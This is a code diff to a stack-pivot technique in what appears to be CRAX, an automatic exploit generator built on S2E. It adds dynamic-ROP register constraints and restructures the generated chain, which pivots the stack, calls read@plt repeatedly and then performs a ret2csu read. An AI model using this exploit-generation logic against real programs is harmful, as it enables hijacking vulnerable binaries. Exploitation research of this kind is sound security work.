@@ -19,11 +19,11 @@
 // SOFTWARE.
 
 #include <s2e/Plugins/CRAX/CRAX.h>
+#include <s2e/Plugins/CRAX/Modules/DynamicRop/DynamicRop.h>
 #include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
 #include <s2e/Plugins/CRAX/Utils/StringUtil.h>
 
 #include <cassert>
-#include <memory>
 
 #include "StackPivot.h"
 
@@ -109,6 +109,40 @@ AdvancedStackPivot::AdvancedStackPivot()
 }
 
 
+void AdvancedStackPivot::initialize() {
+    // XXX: This is gross, refactor this shit... :(
+    static bool initialized = false;
+
+    if (initialized) {
+        return;
+    }
+
+    initialized = true;
+    auto __dynRop = dynamic_cast<DynamicRop *>(g_crax->getModule("DynamicRop"));
+    assert(__dynRop && "AdvancedStackPivot relies on DynamicRop module");
+    auto &dynRop = *__dynRop;
+
+    ref<Expr> rbp1 = ConstantExpr::create(0x404840, Expr::Int64);
+    ref<Expr> rip1 = ConstantExpr::create(0x401180, Expr::Int64);
+
+    dynRop.addConstraint(DynamicRop::RegisterConstraint { Register::X64::RBP, rbp1 })
+        .addConstraint(DynamicRop::RegisterConstraint { Register::X64::RIP, rip1 })
+        .scheduleConstraints();
+
+    ref<Expr> rbp2 = ConstantExpr::create(0x404840 + 8 + 32, Expr::Int64);
+    ref<Expr> rip2 = ConstantExpr::create(0x401180, Expr::Int64);
+
+    dynRop.addConstraint(DynamicRop::RegisterConstraint { Register::X64::RBP, rbp2 })
+        .addConstraint(DynamicRop::RegisterConstraint { Register::X64::RIP, rip2 })
+        .scheduleConstraints();
+
+    // At this point, the exploit generator is already running.
+    // This is our last chance to stop it. This method will throw a
+    // CpuExitException() and force S2E to re-execute at the PC we specified,
+    // allowing us to perform Dynamic ROP.
+    dynRop.applyNextConstraint();
+}
+
 bool AdvancedStackPivot::checkRequirements() const {
     const auto &sym = g_crax->getExploit().getElf().symbols();
     return sym.find("read") != sym.end() && m_readCallSites.size();
@@ -132,35 +166,13 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
     Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
     assert(ret2csu && "Ret2csu object not found");
 
-    // Resolve ret2LeaRbp.
-    // XXX: from balsn: this is a good research topic.
-    const auto &readCallSiteInfo = *m_readCallSites.rbegin();
-    uint64_t ret2LeaRbp = determineRetAddr(readCallSiteInfo.address);
-
-    // Return to a previous call site of read@libc.
-    RopSubchain part1 = {
-        //ByteVectorExpr::create(std::vector<uint8_t>(m_offsetToRetAddr, 'A')),
-        BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
-        BaseOffsetExpr::create(g_crax->getExploit(), "", std::to_string(ret2LeaRbp))};
-
-    // Generate the payload which guides the weird machine back to the exploitable state.
-    RopSubchain part2 = {
-        ByteVectorExpr::create(std::vector<uint8_t>(m_offsetToRetAddr, 'A')),
-        AddExpr::alloc(
-                BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
-                AddExpr::alloc(
-                        ConstantExpr::create(8, Expr::Int64),
-                        ConstantExpr::create(m_offsetToRetAddr, Expr::Int64))),
-        BaseOffsetExpr::create(g_crax->getExploit(), "", std::to_string(ret2LeaRbp))
-    };
-
     // At this point, a stack-buffer overflow should take place inside libc,
     // and the weird machine shall not return from read@libc. Now we will
     // be able to perform ROP, but we don't have enough space to perform
     // a huge read() via ret2csu. So here we'll build a self-extending ROP chain
     // which continuously calls read@plt until there's enough space to perform
     // ret2csu once.
-    RopSubchain part3;
+    RopSubchain part1;
     for (size_t i = 0; i < 6; i++) {
         ref<Expr> e0 = BaseOffsetExpr::create(g_crax->getExploit(), "", "pop_rsi_r15_ret");
         ref<Expr> e1 = AddExpr::alloc(
@@ -173,15 +185,15 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
         ref<Expr> e2 = ConstantExpr::create(0, Expr::Int64);
         ref<Expr> e3 = BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read");
 
-        part3.push_back(e0);
-        part3.push_back(e1);
-        part3.push_back(e2);
-        part3.push_back(e3);
+        part1.push_back(e0);
+        part1.push_back(e1);
+        part1.push_back(e2);
+        part1.push_back(e3);
     }
 
     // Now, we should have accumulated enough space to perform a huge read() via ret2csu.
     // read(0, pivot_dest + 0x30 * 7, 0x400).
-    RopSubchain part4 = ret2csu->getRopSubchains(
+    RopSubchain part2 = ret2csu->getRopSubchains(
             BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
             ConstantExpr::create(0, Expr::Int64),
             AddExpr::alloc(
@@ -191,17 +203,17 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
                             ConstantExpr::create(7, Expr::Int64))),
             ConstantExpr::create(0x400, Expr::Int64))[0];
 
-    while (part4.size() % 6) {
-        part4.push_back(ConstantExpr::create(0, Expr::Int64));
+    while (part2.size() % 6) {
+        part2.push_back(ConstantExpr::create(0, Expr::Int64));
     }
 
 
-    std::vector<RopSubchain> ret = {part1, part2};
-    for (size_t i = 0; i < part3.size(); i += 6) {
-        ret.push_back(RopSubchain(part3.begin() + i, part3.begin() + i + 6));
+    std::vector<RopSubchain> ret;
+    for (size_t i = 0; i < part1.size(); i += 6) {
+        ret.push_back(RopSubchain(part1.begin() + i, part1.begin() + i + 6));
     }
-    for (size_t i = 0; i < part4.size(); i += 6) {
-        ret.push_back(RopSubchain(part4.begin() + i, part4.begin() + i + 6));
+    for (size_t i = 0; i < part2.size(); i += 6) {
+        ret.push_back(RopSubchain(part2.begin() + i, part2.begin() + i + 6));
     }
     return ret;
 }
